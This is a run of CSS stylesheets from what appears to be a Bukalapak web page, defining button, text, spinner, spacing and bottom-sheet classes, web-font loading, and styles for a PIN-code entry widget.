.bl-sheet__overlay,.bl-sheet-animation-leave-active,.bl-sheet-animation-leave-active .bl-sheet__overlay{opacity:0}.bl-sheet-animation-enter .bl-sheet__box,.bl-sheet-animation-leave-active .bl-sheet__box{transform:translateY(100%)}.bl-sheet.is-auto-height .bl-sheet__box{height:auto!important;border-top-right-radius:8px;border-top-left-radius:8px;top:auto;bottom:0;max-height:100vh}.bl-sheet.is-auto-height .bl-sheet__nav-bar{position:relative;border-top-right-radius:8px;border-top-left-radius:8px}.bl-sheet.is-auto-height .bl-sheet__content{margin-top:0;margin-bottom:0;max-height:calc(100vh - 80px);overflow-y:scroll}.bl-sheet--no-title .bl-sheet__nav-bar{border:none}.bl-sheet--no-title .bl-sheet__content{margin-top:16px}.bl-sheet--no-draggable .bl-sheet__content{margin-top:54px}.bl-button{position:relative;display:inline-flex;flex-direction:row;justify-content:center;align-items:center;height:44px;min-width:88px;outline:none;border-radius:4px;cursor:pointer;padding:0 20px;border:1px solid transparent;text-decoration:none;color:#3d3d3d}.bl-button:before{content:""}.bl-button:disabled,.bl-button[aria-disabled]{cursor:not-allowed;pointer-events:none}.bl-button:active .bl-button__icon,.bl-button:active .bl-text{opacity:.6}.bl-button__content,.bl-button__loading{display:flex;align-items:center}.bl-button__loading{position:absolute;flex-direction:row;justify-content:center}.bl-button.is-disabled{cursor:not-allowed}.bl-button.is-disabled .bl-button__icon,.bl-button.is-disabled .bl-text{opacity:.4}.bl-button--naked:active .bl-button__icon,.bl-button--naked:active .bl-text{opacity:1}.bl-button.is-fullwidth{width:100%}.bl-button--small{padding:0 12px;height:36px}.bl-button--small.is-icon-only{width:36px!important}.bl-button--extra-small{padding:0 8px;height:28px}.bl-button--extra-small.is-icon-only{width:28px!important}.bl-button--primary{background-color:#e31e52;border-color:transparent}.bl-button--primary:active{background-color:#b3002d}.bl-button--primary:active .bl-button__icon,.bl-button--primary:active .bl-button__text{opacity:.6}.bl-button--primary.is-disabled{background-color:#ff92b2}.bl-button--primary.is-disabled .bl-button__icon,.bl-button--primary.is-disabled .bl-button__text{opacity:.4}.bl-button--secondary{background-color:#f2f2f2;border-color:transparent}.bl-button--secondary:active{background-color:#e0e0e0}.bl-button--secondary:active .bl-button__icon,.bl-button--secondary:active .bl-button__text{opacity:.6}.bl-button--secondary.is-disabled{background-color:#f2f2f2}.bl-button--secondary.is-disabled .bl-button__icon,.bl-button--secondary.is-disabled .bl-button__text{opacity:.4}.bl-button--outline{background-color:#fff;border-color:#d6d6d6}.bl-button--outline:active{background-color:#f2f2f2}.bl-button--outline:active .bl-button__icon,.bl-button--outline:active .bl-button__text{opacity:.6}.bl-button--outline.is-disabled{background-color:#f2f2f2}.bl-button--outline.is-disabled .bl-button__icon,.bl-button--outline.is-disabled .bl-button__text{opacity:.4}.bl-button--naked{background-color:#fff;border-color:transparent}.bl-button--naked:active{background-color:#f2f2f2}.bl-button--naked:active .bl-button__icon,.bl-button--naked:active .bl-button__text{opacity:.6}.bl-button--naked.is-disabled{background-color:#fff}.bl-button--naked.is-disabled .bl-button__icon,.bl-button--naked.is-disabled .bl-button__text{opacity:.4}.bl-button--outline-white{background-color:initial;border-color:#d6d6d6}.bl-button--outline-white:active{background-color:initial;border-color:hsla(0,0%,92.2%,.6)}.bl-button--outline-white:active .bl-button__icon,.bl-button--outline-white:active .bl-button__text{opacity:.6}.bl-button--outline-white.is-disabled{background-color:initial;border-color:hsla(0,0%,92.2%,.4)}.bl-button--outline-white.is-disabled .bl-button__icon,.bl-button--outline-white.is-disabled .bl-button__text{opacity:.4}.bl-button--naked-inverse{background-color:initial;border-color:transparent}.bl-button--naked-inverse:active{background-color:initial}.bl-button--naked-inverse:active .bl-button__icon,.bl-button--naked-inverse:active .bl-button__text{opacity:.6}.bl-button--naked-inverse.is-disabled{background-color:initial}.bl-button--naked-inverse.is-disabled .bl-button__icon,.bl-button--naked-inverse.is-disabled .bl-button__text{opacity:.4}.bl-button--link{padding:0!important;height:auto!important;width:auto!important;min-width:auto!important;background:none;border:none}.bl-button--link.is-underline .bl-text{color:#3d3d3d;text-decoration:underline;text-underline-position:under}.bl-button--link:active .bl-text{opacity:1;color:#1c3391}.bl-button--link:active.is-underline .bl-text{background:rgba(20,20,20,.05);color:#3d3d3d}.bl-button--link.is-disabled{cursor:not-allowed}.bl-button--link.is-disabled .bl-text{color:#8badf0}.bl-button--link.is-disabled.is-underline .bl-text{color:#b6b6b6}.bl-button__icon{position:relative;line-height:0}.bl-button__icon.is-right{right:-6px}.bl-button__icon.is-left{left:-6px}.bl-button.is-icon-only{min-width:auto;padding:0;width:44px}.bl-button.is-icon-only .bl-button__icon.is-right{right:0}.bl-button.is-icon-only .bl-button__icon.is-left{left:0}.bl-button--floating-center,.bl-button--floating-left,.bl-button--floating-right{border-radius:500px;background-color:#fff;color:#3d3d3d;font-size:14px;height:56px;min-width:56px;box-shadow:0 2px 4px 0 rgba(0,0,0,.1);position:fixed;border:none;bottom:16px}.bl-button--floating-center.is-icon-only,.bl-button--floating-left.is-icon-only,.bl-button--floating-right.is-icon-only{min-width:56px}.bl-button--floating-center:active,.bl-button--floating-left:active,.bl-button--floating-right:active{background-color:#ebebeb}.bl-button--floating-center:active .bl-button__icon,.bl-button--floating-left:active .bl-button__icon,.bl-button--floating-right:active .bl-button__icon{opacity:.6}.bl-button--floating-center .bl-button__text,.bl-button--floating-left .bl-button__text,.bl-button--floating-right .bl-button__text{font-size:14px}.bl-button--floating-center.bl-button--small,.bl-button--floating-left.bl-button--small,.bl-button--floating-right.bl-button--small{height:40px;min-width:40px;padding:0 16px}.bl-button--floating-center.bl-button--small .bl-button__text,.bl-button--floating-left.bl-button--small .bl-button__text,.bl-button--floating-right.bl-button--small .bl-button__text{font-size:12px}.bl-button--floating-center .bl-icon-default,.bl-button--floating-left .bl-icon-default,.bl-button--floating-right .bl-icon-default{background:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2712%27 height=%2710%27%3E%3Cpath fill=%27%233d3d3d%27 d=%27M11.539.205a1.147 1.147 0 00-1.56.237l-5.19 6.853-2.858-2.794a1.147 1.147 0 00-1.578-.046 1.037 1.037 0 00-.05 1.512s3.474 3.479 3.973 3.828a1.147 1.147 0 001.56-.237l5.95-7.856a1.042 1.042 0 00-.247-1.497z%27/%3E%3C/svg%3E") no-repeat 50%}.bl-button--floating-right{right:16px;left:auto}.bl-button--floating-left{left:16px;right:auto}.bl-button--floating-center{left:50%;right:auto;transform:translateX(-50%)}.bl-button[class*=bl-button--floating]{background-color:#fff}.bl-button[class*=bl-button--floating].is-disabled{background-color:#f2f2f2}.bl-button.bl-button--blue{color:#fff;background-color:#2b4ac7}.bl-button.bl-button--blue:active{background-color:#1c3391}.bl-button.bl-button--blue.is-disabled{background-color:#8badf0}.bl-text{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:14px;color:#141414;font-weight:400;margin:0;text-decoration:none;line-height:normal}.bl-text.bl-text--ellipsis-1,.bl-text.bl-text--ellipsis-2,.bl-text.bl-text--ellipsis-3{overflow:hidden;-webkit-box-orient:vertical;display:-webkit-box}.bl-text.bl-text--ellipsis-1{-webkit-line-clamp:1}.bl-text.bl-text--ellipsis-2{-webkit-line-clamp:2}.bl-text.bl-text--ellipsis-3{-webkit-line-clamp:3}.bl-text--primary{color:#141414}.bl-text--secondary{color:#3d3d3d}.bl-text--subdued{color:#8d8d8d}.bl-text--disabled{color:#b6b6b6}.bl-text--inverse{color:#fff}.bl-text--highlight-01{color:#d1083a}.bl-text--informational-01{color:#0e1a4d}.bl-text--informational-02{color:#3a5fd6}.bl-text--success-01{color:#01271c}.bl-text--success-02{color:#128c55}.bl-text--warning-01{color:#bf4400}.bl-text--warning-02{color:#4d2309}.bl-text--error-01{color:#e60505}.bl-text--error-02{color:#7a0602}.bl-text--attention-01{color:#332205}.bl-text--link-01{color:#2b4ac7}.bl-text--link-01-disabled,.bl-text--link-01-inverse{color:#8badf0}.bl-text--body{color:#3d3d3d}.bl-text--heading{color:#141414}.bl-text--white{color:#fff}.bl-text--success{color:#128c55}.bl-text--critical{color:#7a0602}.bl-text--warning{color:#4d2309}.bl-text--error{color:#f42c2c}.bl-text--caption-08{font-size:8px;font-weight:500}.bl-text--caption-08.bl-text--ellipsis-1{max-height:10.4px}.bl-text--caption-08.bl-text--ellipsis-2{max-height:20.8px}.bl-text--caption-08.bl-text--ellipsis-3{max-height:31.2px}.bl-text--caption-10{font-size:10px}.bl-text--caption-10.bl-text--ellipsis-1{max-height:13px}.bl-text--caption-10.bl-text--ellipsis-2{max-height:26px}.bl-text--caption-10.bl-text--ellipsis-3{max-height:39px}.bl-text--caption-12{font-size:12px}.bl-text--caption-12.bl-text--ellipsis-1{max-height:15.6px}.bl-text--caption-12.bl-text--ellipsis-2{max-height:31.2px}.bl-text--caption-12.bl-text--ellipsis-3{max-height:46.8px}.bl-text--body-14{font-size:14px}.bl-text--body-14.bl-text--ellipsis-1{max-height:18.2px}.bl-text--body-14.bl-text--ellipsis-2{max-height:36.4px}.bl-text--body-14.bl-text--ellipsis-3{max-height:54.6px}.bl-text--body-long-14{font-size:14px}.bl-text--body-long-14.bl-text--ellipsis-1{max-height:18.2px}.bl-text--body-long-14.bl-text--ellipsis-2{max-height:36.4px}.bl-text--body-long-14.bl-text--ellipsis-3{max-height:54.6px}.bl-text--body-16{font-size:16px}.bl-text--body-16.bl-text--ellipsis-1{max-height:20.8px}.bl-text--body-16.bl-text--ellipsis-2{max-height:41.6px}.bl-text--body-16.bl-text--ellipsis-3{max-height:62.4px}.bl-text--body-long-16{font-size:16px}.bl-text--body-long-16.bl-text--ellipsis-1{max-height:20.8px}.bl-text--body-long-16.bl-text--ellipsis-2{max-height:41.6px}.bl-text--body-long-16.bl-text--ellipsis-3{max-height:62.4px}.bl-text--subheading-18{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:18px;font-weight:500}.bl-text--subheading-18.bl-text--ellipsis-1{max-height:23.4px}.bl-text--subheading-18.bl-text--ellipsis-2{max-height:46.8px}.bl-text--subheading-18.bl-text--ellipsis-3{max-height:70.2px}.bl-text--subheading-20{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:20px;font-weight:500}.bl-text--subheading-20.bl-text--ellipsis-1{max-height:26px}.bl-text--subheading-20.bl-text--ellipsis-2{max-height:52px}.bl-text--subheading-20.bl-text--ellipsis-3{max-height:78px}.bl-text--heading-24{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:24px;font-weight:700}.bl-text--heading-24.bl-text--ellipsis-1{max-height:31.2px}.bl-text--heading-24.bl-text--ellipsis-2{max-height:62.4px}.bl-text--heading-24.bl-text--ellipsis-3{max-height:93.6px}.bl-text--heading-28{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:28px;font-weight:700}.bl-text--heading-28.bl-text--ellipsis-1{max-height:36.4px}.bl-text--heading-28.bl-text--ellipsis-2{max-height:72.8px}.bl-text--heading-28.bl-text--ellipsis-3{max-height:109.2px}.bl-text--heading-32{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:32px;font-weight:700}.bl-text--heading-32.bl-text--ellipsis-1{max-height:41.6px}.bl-text--heading-32.bl-text--ellipsis-2{max-height:83.2px}.bl-text--heading-32.bl-text--ellipsis-3{max-height:124.8px}.bl-text--heading-42{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:42px;font-weight:700}.bl-text--heading-42.bl-text--ellipsis-1{max-height:54.6px}.bl-text--heading-42.bl-text--ellipsis-2{max-height:109.2px}.bl-text--heading-42.bl-text--ellipsis-3{max-height:163.8px}.bl-text--bold{font-weight:700}.bl-text--semi-bold{font-weight:600}.bl-text--medium{font-weight:500}.bl-text--regular{font-weight:400}.bl-text--link-primary{color:#2b4ac7;text-decoration:none}.bl-text--link-primary:active{color:#1c3391}.bl-text--link-primary.bl-text--disabled{color:#8badf0;cursor:not-allowed}.bl-text--link-secondary{color:#3d3d3d;text-decoration:underline;text-underline-position:under}.bl-text--link-secondary:active{background:rgba(20,20,20,.05)}.bl-text--link-secondary.bl-text--disabled{color:#b6b6b6;cursor:not-allowed}.bl-text--link-inverse{color:#fff;text-decoration:underline;text-underline-position:under}.bl-text--link-inverse.bl-text--disabled{color:#b6b6b6;cursor:not-allowed}.bl-text--line-through{text-decoration:line-through}.bl-spinner{position:relative}.bl-spinner__dot{display:inline-block;background:#b6b6b6;height:12px;width:12px;border-radius:100%;margin:1px;animation-name:wormLoad;animation-duration:.6s;animation-iteration-count:infinite;animation-timing-function:ease-in-out;animation-fill-mode:both}.bl-spinner__dot:first-child{animation-delay:.07s}.bl-spinner__dot:nth-child(2){animation-delay:.14s}.bl-spinner__dot:nth-child(3){animation-delay:.21s}.bl-spinner--small .bl-spinner__dot{height:8px;width:8px;animation-name:wormLoadSmall;animation-duration:1.4s;margin:1px}.bl-spinner--small .bl-spinner__dot:first-child{animation-delay:-.24s}.bl-spinner--small .bl-spinner__dot:nth-child(2){animation-delay:-.12s}@keyframes wormLoad{33%{transform:translateY(6px)}66%{transform:translateY(-6px)}to{transform:translateY(0)}}@keyframes wormLoadSmall{0%,80%,to{transform:scale(0)}40%{transform:scale(1)}}</style>
  <style type="text/css">.bl-text{font-family:Buka Sans Text,Hind Madurai,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:14px;color:#141414;font-weight:400;margin:0;text-decoration:none;line-height:normal}.bl-text.bl-text--ellipsis-1,.bl-text.bl-text--ellipsis-2,.bl-text.bl-text--ellipsis-3{overflow:hidden;-webkit-box-orient:vertical;display:-webkit-box}.bl-text.bl-text--ellipsis-1{-webkit-line-clamp:1}.bl-text.bl-text--ellipsis-2{-webkit-line-clamp:2}.bl-text.bl-text--ellipsis-3{-webkit-line-clamp:3}.bl-text--primary{color:#141414}.bl-text--secondary{color:#3d3d3d}.bl-text--subdued{color:#8d8d8d}.bl-text--disabled{color:#b6b6b6}.bl-text--inverse{color:#fff}.bl-text--highlight-01{color:#d1083a}.bl-text--informational-01{color:#0e1a4d}.bl-text--informational-02{color:#3a5fd6}.bl-text--success-01{color:#01271c}.bl-text--success-02{color:#128c55}.bl-text--warning-01{color:#bf4400}.bl-text--warning-02{color:#4d2309}.bl-text--error-01{color:#e60505}.bl-text--error-02{color:#7a0602}.bl-text--attention-01{color:#332205}.bl-text--link-01{color:#2b4ac7}.bl-text--link-01-disabled,.bl-text--link-01-inverse{color:#8badf0}.bl-text--body{color:#3d3d3d}.bl-text--heading{color:#141414}.bl-text--white{color:#fff}.bl-text--success{color:#128c55}.bl-text--critical{color:#7a0602}.bl-text--warning{color:#4d2309}.bl-text--error{color:#f42c2c}.bl-text--caption-08{font-size:8px;font-weight:500}.bl-text--caption-08.bl-text--ellipsis-1{max-height:10.4px}.bl-text--caption-08.bl-text--ellipsis-2{max-height:20.8px}.bl-text--caption-08.bl-text--ellipsis-3{max-height:31.2px}.bl-text--caption-10{font-size:10px}.bl-text--caption-10.bl-text--ellipsis-1{max-height:13px}.bl-text--caption-10.bl-text--ellipsis-2{max-height:26px}.bl-text--caption-10.bl-text--ellipsis-3{max-height:39px}.bl-text--caption-12{font-size:12px}.bl-text--caption-12.bl-text--ellipsis-1{max-height:15.6px}.bl-text--caption-12.bl-text--ellipsis-2{max-height:31.2px}.bl-text--caption-12.bl-text--ellipsis-3{max-height:46.8px}.bl-text--body-14{font-size:14px}.bl-text--body-14.bl-text--ellipsis-1{max-height:18.2px}.bl-text--body-14.bl-text--ellipsis-2{max-height:36.4px}.bl-text--body-14.bl-text--ellipsis-3{max-height:54.6px}.bl-text--body-long-14{font-size:14px}.bl-text--body-long-14.bl-text--ellipsis-1{max-height:18.2px}.bl-text--body-long-14.bl-text--ellipsis-2{max-height:36.4px}.bl-text--body-long-14.bl-text--ellipsis-3{max-height:54.6px}.bl-text--body-16{font-size:16px}.bl-text--body-16.bl-text--ellipsis-1{max-height:20.8px}.bl-text--body-16.bl-text--ellipsis-2{max-height:41.6px}.bl-text--body-16.bl-text--ellipsis-3{max-height:62.4px}.bl-text--body-long-16{font-size:16px}.bl-text--body-long-16.bl-text--ellipsis-1{max-height:20.8px}.bl-text--body-long-16.bl-text--ellipsis-2{max-height:41.6px}.bl-text--body-long-16.bl-text--ellipsis-3{max-height:62.4px}.bl-text--subheading-18{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:18px;font-weight:500}.bl-text--subheading-18.bl-text--ellipsis-1{max-height:23.4px}.bl-text--subheading-18.bl-text--ellipsis-2{max-height:46.8px}.bl-text--subheading-18.bl-text--ellipsis-3{max-height:70.2px}.bl-text--subheading-20{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:20px;font-weight:500}.bl-text--subheading-20.bl-text--ellipsis-1{max-height:26px}.bl-text--subheading-20.bl-text--ellipsis-2{max-height:52px}.bl-text--subheading-20.bl-text--ellipsis-3{max-height:78px}.bl-text--heading-24{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:24px;font-weight:700}.bl-text--heading-24.bl-text--ellipsis-1{max-height:31.2px}.bl-text--heading-24.bl-text--ellipsis-2{max-height:62.4px}.bl-text--heading-24.bl-text--ellipsis-3{max-height:93.6px}.bl-text--heading-28{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:28px;font-weight:700}.bl-text--heading-28.bl-text--ellipsis-1{max-height:36.4px}.bl-text--heading-28.bl-text--ellipsis-2{max-height:72.8px}.bl-text--heading-28.bl-text--ellipsis-3{max-height:109.2px}.bl-text--heading-32{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:32px;font-weight:700}.bl-text--heading-32.bl-text--ellipsis-1{max-height:41.6px}.bl-text--heading-32.bl-text--ellipsis-2{max-height:83.2px}.bl-text--heading-32.bl-text--ellipsis-3{max-height:124.8px}.bl-text--heading-42{font-family:Buka Sans Display,Muli,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;font-size:42px;font-weight:700}.bl-text--heading-42.bl-text--ellipsis-1{max-height:54.6px}.bl-text--heading-42.bl-text--ellipsis-2{max-height:109.2px}.bl-text--heading-42.bl-text--ellipsis-3{max-height:163.8px}.bl-text--bold{font-weight:700}.bl-text--semi-bold{font-weight:600}.bl-text--medium{font-weight:500}.bl-text--regular{font-weight:400}.bl-text--link-primary{color:#2b4ac7;text-decoration:none}.bl-text--link-primary:active{color:#1c3391}.bl-text--link-primary.bl-text--disabled{color:#8badf0;cursor:not-allowed}.bl-text--link-secondary{color:#3d3d3d;text-decoration:underline;text-underline-position:under}.bl-text--link-secondary:active{background:rgba(20,20,20,.05)}.bl-text--link-secondary.bl-text--disabled{color:#b6b6b6;cursor:not-allowed}.bl-text--link-inverse{color:#fff;text-decoration:underline;text-underline-position:under}.bl-text--link-inverse.bl-text--disabled{color:#b6b6b6;cursor:not-allowed}.bl-text--line-through{text-decoration:line-through}</style>
  <style type="text/css">body,html{margin:0;padding:0;height:100%;-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent;box-sizing:border-box}.clearfix{zoom:1}.clearfix:after,.clearfix:before{content:".";display:block;overflow:hidden;visibility:hidden;font-size:0;line-height:0;width:0;height:0}.clearfix:after{clear:both}*,:after,:before{box-sizing:inherit}@font-face{font-family:Buka Sans Display;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansDisplay-Bold-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansDisplay-Bold-v2.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}@font-face{font-family:Buka Sans Display;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansDisplay-Medium-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansDisplay-Medium-v2.woff) format("woff");font-weight:500;font-style:normal;font-display:swap}@font-face{font-family:Buka Sans Text;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Bold-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Bold-v2.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}@font-face{font-family:Buka Sans Text;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Medium-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Medium-v2.woff) format("woff");font-weight:500;font-style:normal;font-display:swap}@font-face{font-family:Buka Sans Text;src:url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Regular-v2.woff2) format("woff2"),url(https://s0.bukalapak.com/ast/bukasans/BukaSansText-Regular-v2.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}.p-0{padding:0!important}.p-4{padding:4px!important}.p-8{padding:8px!important}.p-12{padding:12px!important}.p-16{padding:16px!important}.p-20{padding:20px!important}.p-24{padding:24px!important}.p-28{padding:28px!important}.p-32{padding:32px!important}.p-48{padding:48px!important}.p-56{padding:56px!important}.pt-0{padding-top:0!important}.pt-4{padding-top:4px!important}.pt-8{padding-top:8px!important}.pt-12{padding-top:12px!important}.pt-16{padding-top:16px!important}.pt-20{padding-top:20px!important}.pt-24{padding-top:24px!important}.pt-28{padding-top:28px!important}.pt-32{padding-top:32px!important}.pt-48{padding-top:48px!important}.pt-56{padding-top:56px!important}.pr-0{padding-right:0!important}.pr-4{padding-right:4px!important}.pr-8{padding-right:8px!important}.pr-12{padding-right:12px!important}.pr-16{padding-right:16px!important}.pr-20{padding-right:20px!important}.pr-24{padding-right:24px!important}.pr-28{padding-right:28px!important}.pr-32{padding-right:32px!important}.pr-48{padding-right:48px!important}.pr-56{padding-right:56px!important}.pb-0{padding-bottom:0!important}.pb-4{padding-bottom:4px!important}.pb-8{padding-bottom:8px!important}.pb-12{padding-bottom:12px!important}.pb-16{padding-bottom:16px!important}.pb-20{padding-bottom:20px!important}.pb-24{padding-bottom:24px!important}.pb-28{padding-bottom:28px!important}.pb-32{padding-bottom:32px!important}.pb-48{padding-bottom:48px!important}.pb-56{padding-bottom:56px!important}.pl-0{padding-left:0!important}.pl-4{padding-left:4px!important}.pl-8{padding-left:8px!important}.pl-12{padding-left:12px!important}.pl-16{padding-left:16px!important}.pl-20{padding-left:20px!important}.pl-24{padding-left:24px!important}.pl-28{padding-left:28px!important}.pl-32{padding-left:32px!important}.pl-48{padding-left:48px!important}.pl-56{padding-left:56px!important}.m-0{margin:0!important}.m-4{margin:4px!important}.m-8{margin:8px!important}.m-12{margin:12px!important}.m-16{margin:16px!important}.m-20{margin:20px!important}.m-24{margin:24px!important}.m-28{margin:28px!important}.m-32{margin:32px!important}.m-48{margin:48px!important}.m-56{margin:56px!important}.mt-0{margin-top:0!important}.mt-4{margin-top:4px!important}.mt-8{margin-top:8px!important}.mt-12{margin-top:12px!important}.mt-16{margin-top:16px!important}.mt-20{margin-top:20px!important}.mt-24{margin-top:24px!important}.mt-28{margin-top:28px!important}.mt-32{margin-top:32px!important}.mt-48{margin-top:48px!important}.mt-56{margin-top:56px!important}.mr-0{margin-right:0!important}.mr-4{margin-right:4px!important}.mr-8{margin-right:8px!important}.mr-12{margin-right:12px!important}.mr-16{margin-right:16px!important}.mr-20{margin-right:20px!important}.mr-24{margin-right:24px!important}.mr-28{margin-right:28px!important}.mr-32{margin-right:32px!important}.mr-48{margin-right:48px!important}.mr-56{margin-right:56px!important}.mb-0{margin-bottom:0!important}.mb-4{margin-bottom:4px!important}.mb-8{margin-bottom:8px!important}.mb-12{margin-bottom:12px!important}.mb-16{margin-bottom:16px!important}.mb-20{margin-bottom:20px!important}.mb-24{margin-bottom:24px!important}.mb-28{margin-bottom:28px!important}.mb-32{margin-bottom:32px!important}.mb-48{margin-bottom:48px!important}.mb-56{margin-bottom:56px!important}.ml-0{margin-left:0!important}.mv-0{margin-top:0!important;margin-bottom:0!important}.pv-0{padding-top:0!important;padding-bottom:0!important}.mh-0{margin-left:0!important;margin-right:0!important}.ph-0{padding-left:0!important;padding-right:0!important}.ml-4{margin-left:4px!important}.mv-4{margin-top:4px!important;margin-bottom:4px!important}.pv-4{padding-top:4px!important;padding-bottom:4px!important}.mh-4{margin-left:4px!important;margin-right:4px!important}.ph-4{padding-left:4px!important;padding-right:4px!important}.ml-8{margin-left:8px!important}.mv-8{margin-top:8px!important;margin-bottom:8px!important}.pv-8{padding-top:8px!important;padding-bottom:8px!important}.mh-8{margin-left:8px!important;margin-right:8px!important}.ph-8{padding-left:8px!important;padding-right:8px!important}.ml-12{margin-left:12px!important}.mv-12{margin-top:12px!important;margin-bottom:12px!important}.pv-12{padding-top:12px!important;padding-bottom:12px!important}.mh-12{margin-left:12px!important;margin-right:12px!important}.ph-12{padding-left:12px!important;padding-right:12px!important}.ml-16{margin-left:16px!important}.mv-16{margin-top:16px!important;margin-bottom:16px!important}.pv-16{padding-top:16px!important;padding-bottom:16px!important}.mh-16{margin-left:16px!important;margin-right:16px!important}.ph-16{padding-left:16px!important;padding-right:16px!important}.ml-20{margin-left:20px!important}.mv-20{margin-top:20px!important;margin-bottom:20px!important}.pv-20{padding-top:20px!important;padding-bottom:20px!important}.mh-20{margin-left:20px!important;margin-right:20px!important}.ph-20{padding-left:20px!important;padding-right:20px!important}.ml-24{margin-left:24px!important}.mv-24{margin-top:24px!important;margin-bottom:24px!important}.pv-24{padding-top:24px!important;padding-bottom:24px!important}.mh-24{margin-left:24px!important;margin-right:24px!important}.ph-24{padding-left:24px!important;padding-right:24px!important}.ml-28{margin-left:28px!important}.mv-28{margin-top:28px!important;margin-bottom:28px!important}.pv-28{padding-top:28px!important;padding-bottom:28px!important}.mh-28{margin-left:28px!important;margin-right:28px!important}.ph-28{padding-left:28px!important;padding-right:28px!important}.ml-32{margin-left:32px!important}.mv-32{margin-top:32px!important;margin-bottom:32px!important}.pv-32{padding-top:32px!important;padding-bottom:32px!important}.mh-32{margin-left:32px!important;margin-right:32px!important}.ph-32{padding-left:32px!important;padding-right:32px!important}.ml-48{margin-left:48px!important}.mv-48{margin-top:48px!important;margin-bottom:48px!important}.pv-48{padding-top:48px!important;padding-bottom:48px!important}.mh-48{margin-left:48px!important;margin-right:48px!important}.ph-48{padding-left:48px!important;padding-right:48px!important}.ml-56{margin-left:56px!important}.mv-56{margin-top:56px!important;margin-bottom:56px!important}.pv-56{padding-top:56px!important;padding-bottom:56px!important}.mh-56{margin-left:56px!important;margin-right:56px!important}.ph-56{padding-left:56px!important;padding-right:56px!important}</style>
  <style type="text/css">.flex {
  display: flex;
}

.justify-content-center {
  justify-content: center;
}

.justify-content-flex-start {
  justify-content: flex-start;
}

.space-between {
  justify-content: space-between;
}

.align-items-center {
  align-items: center;
}

.u-mrgn-bottom--6 {
  margin-bottom: 36px!important;
}

.u-mrgn-bottom--5 {
  margin-bottom: 30px!important;
}</style>
  <style type="text/css">.pin-js-text-center{
  text-align: center;
}

.pin-js-illust-small {
  width: 64px;
  height: 64px;
}

.pin-js-illust-medium {
  width: 198px;
  height: 120px;
}</style>
  <style type="text/css">
.pin-code-item[data-v-b63d0b40] {
  width: 28px;
  height: 28px;
  border: 1px solid #d6d6d6;
  border-radius: 999px;
  margin: 0 6px;
  background-color: white;
}
.pin-code-item.active[data-v-b63d0b40] {
  border: 2px solid #4f78e8;
}
.pin-code-item.filled[data-v-b63d0b40] {
  background-color: black;
  border: 0;
}
.hidden-field[data-v-b63d0b40] {
  opacity: 0;
  cursor: default;
}
</style>
